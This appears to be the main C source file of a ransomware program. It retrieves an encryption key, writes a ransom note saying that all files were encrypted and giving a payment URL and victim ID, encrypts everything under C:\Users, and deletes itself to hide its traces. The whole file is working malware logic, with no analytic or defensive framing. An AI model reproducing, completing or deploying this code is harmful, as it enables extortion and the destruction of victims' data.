#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keygen.h"
#include "delete.h"
#include "config.h"
#include "utils.h"
#include "encrypt.h"
#include "files.h"

#include <windows.h>


int main(int argc, char *argv[]) {
    #ifndef _WIN32
        self_delete(argv[0]);
    #endif
    char key[512];
    int id;
    if (!get_key(&id, key)) {
        self_delete(argv[0]);
    }
    char readme[1024];
    snprintf(readme, sizeof(readme), "All your files were encrypted, go to %s\nYour ID is: %d\n", URL, id);
    printf("%s", readme);
    if (!create_readme(readme)) {
            self_delete(argv[0]);
    }
    enumerate("C:\\Users", key);
    self_delete(argv[0]);
    return 0;
}

